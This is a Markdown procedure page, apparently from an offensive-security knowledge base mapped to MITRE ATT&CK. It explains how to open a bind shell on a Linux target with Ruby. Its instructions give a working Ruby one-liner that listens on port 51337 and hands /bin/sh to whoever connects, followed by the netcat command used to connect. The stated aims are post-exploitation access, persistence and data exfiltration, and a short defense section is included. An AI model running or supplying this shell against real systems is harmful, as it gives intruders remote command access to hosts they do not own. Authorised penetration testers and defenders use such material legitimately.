---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - bind-shell
  - ruby
  - payload
commands:
  - '[[commands/execute-ruby-bind-shell]]'
  - '[[commands/nc-connect-bind-shell]]'
platforms:
  - Linux
  - Unix
tools: []
verified: true
validated: true
---

# Ruby-Bind-Shell

## Summary

The Ruby Bind Shell procedure enables the creation of a bind shell on a target system using a concise Ruby one-liner. This allows an attacker with command execution capability to open a listening port on the target, enabling remote connection for interactive shell access. It is particularly useful in scenarios where outbound connections from the target are restricted, but inbound connections to the target are possible.

## Description

A bind shell involves the target system acting as a server, listening on a specified TCP port for an incoming connection from the attacker's machine. Upon connection, a shell process (/bin/sh) is spawned with its input, output, and error streams redirected to the socket, providing the attacker with command execution capabilities. This technique requires Ruby to be installed on the target and is commonly used post-exploitation for gaining persistent remote access. The procedure assumes the attacker has already achieved initial code execution on the target, such as through a vulnerable web application or privilege escalation. Success results in an interactive shell session, allowing file access, command execution, and further lateral movement. Note that this is a bind shell, not a reverse shell; the target listens, and the attacker initiates the connection.

## Requirements

1. Ruby interpreter installed on the target system (version 1.9+ compatible with the socket library).
2. Network connectivity allowing the attacker to reach the target's IP and specified port (e.g., no inbound firewall blocking the port).
3. Command execution privileges on the target to run the Ruby one-liner.
4. Netcat (nc) or equivalent tool on the attacker's machine for connecting.

## Defense

Defensive measures and detection strategies:

- Implement host-based firewalls (e.g., iptables, ufw) to block inbound connections to non-standard ports like 51337.
- Monitor network traffic for unexpected listening services on high ports using tools like netstat, ss, or IDS/IPS systems (e.g., Snort rules for Ruby process spawning shells).
- Enable process auditing and logging (e.g., auditd on Linux) to detect unusual Ruby executions or socket creations tied to shell processes.
- Use endpoint detection and response (EDR) tools to alert on command-line executions involving Ruby with socket imports.

## Objectives

1. Establish remote shell access to the target system for command execution.
2. Maintain interactive access for post-exploitation activities like enumeration or data exfiltration.
3. Enable persistence in environments where reverse shells are blocked by outbound firewalls.

## Instructions

### Step 1: Execute Bind Shell Listener on Target

**Context**: This step deploys the Ruby script on the target to create a TCP listener on port 51337. The script uses Ruby's socket library to accept connections and redirect a shell to the socket. Run this via an existing shell, RCE vulnerability, or uploaded script.

**Command** ([[commands/execute-ruby-bind-shell]]):
```bash
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

> This command loads the socket library, creates a TCPServer on port 51337, accepts an incoming connection, and executes /bin/sh with I/O redirected to the socket. It runs silently in the background if executed non-interactively. Verify by checking listening ports with `netstat -tlnp | grep 51337` (expected: ruby process listening on 0.0.0.0:51337).

### Step 2: Connect to the Bind Shell from Attacker Machine

**Context**: Once the listener is active on the target, connect from your controlled machine to interact with the shell. This establishes the remote session, allowing command input and output.

**Command** ([[commands/nc-connect-bind-shell]]):
```bash
nc $_TARGET_IP 51337
```

> This uses netcat to connect to the target's IP on port 51337, handing off control to the bound shell. Upon success, you receive a shell prompt (e.g., $ or # depending on privileges). Test with commands like `whoami` or `id`. If connection fails, check firewall rules or confirm the listener is running. Exit the shell with Ctrl+C or `exit`.
